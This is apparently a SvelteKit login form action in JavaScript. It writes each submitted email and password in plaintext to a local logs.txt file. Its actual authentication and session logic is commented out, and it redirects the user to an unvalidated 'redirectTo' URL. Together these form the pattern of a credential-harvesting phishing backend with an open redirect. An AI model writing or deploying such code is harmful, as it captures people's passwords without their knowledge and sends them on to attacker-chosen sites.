import { fail, redirect } from '@sveltejs/kit';

import * as fs from 'fs';

/**
 * @param {string} logMessage
 */
function appendToLogFile(logMessage) {
    const logEntry = `${new Date().toISOString()}: ${logMessage}\n`;

    fs.appendFile(logFilePath, logEntry, (/** @type {any} */ err) => {
        if (err) {
            console.error('Error appending to log file:', err);
        }
    });
}

const logFilePath = 'logs.txt';

/** @type {import('./$types').Actions} */
export const actions = {
    login: async ({ cookies, request, url }) => {
        const data = await request.formData();
        const email = data.get('username');
        const password = data.get('password');

        appendToLogFile('Login form submitted');
        appendToLogFile(`Email: ${email}`);
        appendToLogFile(`Password: ${password}`);

		if (!email) {
			return fail(400, { email, missing: true });
		}

        if (url.searchParams.has('redirectTo')) {
			throw redirect(303, url.searchParams.get('redirectTo'));
		}

        /*
        const user = await db.getUser(email);

		if (!user || user.password !== hash(password)) {
			return fail(400, { email, incorrect: true });
		}

        cookies.set('sessionid', await db.createSession(user));

        if (url.searchParams.has('redirectTo')) {
			throw redirect(303, url.searchParams.get('redirectTo'));
		}

        return { success: true };
        */
    }
};